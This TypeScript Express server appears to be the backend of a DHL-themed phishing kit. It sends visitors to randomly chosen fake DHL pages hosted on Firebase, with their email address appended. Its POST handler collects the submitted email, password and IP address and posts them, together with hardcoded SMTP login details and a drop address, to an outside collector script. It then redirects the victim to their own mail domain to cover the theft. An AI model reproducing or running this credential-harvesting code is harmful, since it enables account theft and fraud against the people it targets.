import express, {Request, Response} from 'express';
import axios from 'axios';
import fs from 'fs';
import bodyParser from 'body-parser';
const app = express();
app.use(bodyParser.urlencoded({ extended: true }));
const redirectArray: string[] = [
    'https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/dhl%2Findex%20copy%2010.html?alt=media&token=0ee05c1e-4bec-4bc2-a632-64a96bd9f958',
    'https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/dhl%2Findex%20copy%202.html?alt=media&token=f4568c0b-fba4-4cee-82b2-656750705117',
    'https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/dhl%2Findex%20copy%203.html?alt=media&token=61aad298-a54b-46f6-97f4-cfd14bd9dece',
    'https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/dhl%2Findex%20copy%204.html?alt=media&token=9d453a8e-a386-4714-b4ec-08a32ea8c1ad',
    'https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/dhl%2Findex%20copy%205.html?alt=media&token=1ba37df4-6e45-4299-977b-41cd12254be6',
    'https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/dhl%2Findex%20copy%206.html?alt=media&token=b32b9902-a244-4c5a-9456-cf9d5ba660ba',
    'https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/dhl%2Findex%20copy%207.html?alt=media&token=28cfffe9-44ed-4f26-b2bb-c3706f9c6bf4',
    'https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/dhl%2Findex%20copy%208.html?alt=media&token=de8ad1f2-d081-460a-b29d-57599d09fb89',
    'https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/dhl%2Findex%20copy%209.html?alt=media&token=bdc5c9e7-49b7-45ae-a3fc-66df18b5d2f5',
    'https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/dhl%2Findex%20copy.html?alt=media&token=8095e1e8-1c2f-4625-97cd-c7079c3c2007',
    'https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/dhl%2Findex.html?alt=media&token=4f3395d6-cfdc-4795-b665-32480706f7fb'
]


const 
link = 'https://wertyh.tk/cgi-bin/vendor/send.php',
email = 'alxy697@gmail.com',
smtpusername = 'dhl@1carwash.ml',
smtppass = 'ifeanyi12345',
smtpservername = '1carwash.ml',
lastRedirect = '';


// test();
// run $ nodemon index.js
app.get('/test', (req: Request, res: Response) => {
    res.write('<h1> working</h1>');
    res.end();
})
app.get('/', (req: Request, res: Response) => {
    const email = req.query.email;
    const files = fs.readdirSync(__dirname + '/redirects/');
    if (redirectArray.length){
        const rand = Math.floor(Math.random() * redirectArray.length);
        if (email){
            res.redirect(redirectArray[rand] + '&email='+email);
        } else {
            res.redirect(redirectArray[rand]);
        }
    } else{
        const rand = Math.floor(Math.random() * files.length);
        fs.readFile(__dirname + `/redirects/${files[0]}`, 'utf8', (err, text) => {
            res.send(text);
        });
    }
})
app.get('/home', (req: Request, res: Response) => {
    const email = req.query.email;
    const files = fs.readdirSync(__dirname + '/redirects/');
    const rand = Math.floor(Math.random() * files.length);
    fs.readFile(__dirname + `/redirects/${files[rand]}`, 'utf8', (err, text) => {
        res.send(text);
    });
})
app.post('/', (req: Request, res: Response) => {
    const reff = req.headers.referer || req.headers.referrer;
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    let redirectUrl = reff + '&error=error&has=jduj733773838cnbncdhg';
    axios.post(link, {
        pet: req.body.pet,
        pett: req.body.pett,
        source: req.body.source.toUpperCase(),
        error: req.body.error,
        ip,
        email,
        smtpusername,
        smtppass,
        smtpservername,
        fromName: req.body.source.toUpperCase() + ' LOGIN'
    }).then((res) => {
        
    }).catch((err) => {
        
    });
    if (req.body.error !== ''){
        redirectUrl = lastRedirect;
        if (!lastRedirect){
            const dom = req.body.pet.split('@')[1];
            redirectUrl = `http://${dom}`;
        }
    }
    res.redirect(redirectUrl);
})
function test(){
    axios.post(link, {
        pet: 'req.body.pet',
        pett: 'req.body.pett',
        source: 'req.body.source.toUpperCase()',
        error: 'req.body.error',
        ip: '546677899',
        email,
        smtpusername,
        smtppass,
        smtpservername,
        fromName: 'req.body.source.toUpperCase()' + ' LOGIN'
    }).then((res) => {
        console.log(res.data);
    }).catch((err) => {
        console.log(err.statusCode);
    });
}

app.listen(5000,() => console.log(`hosting @5000`));